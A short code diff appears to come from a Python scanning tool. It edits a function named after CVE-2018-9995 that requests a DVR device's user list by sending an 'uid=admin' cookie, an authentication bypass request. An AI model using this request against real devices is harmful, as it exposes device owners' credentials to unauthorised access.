@@ -7,7 +7,7 @@ from Ingram.utils import logger
 
 def cve_2018_9995(ip: str) -> list:
     headers = {
-        'User-Agent': config.USERAGENT,
+        'Connection': 'close',
         'Cookie': 'uid=admin',
     }
     url = f"http://{ip}/device.rsp?opt=user&cmd=list"
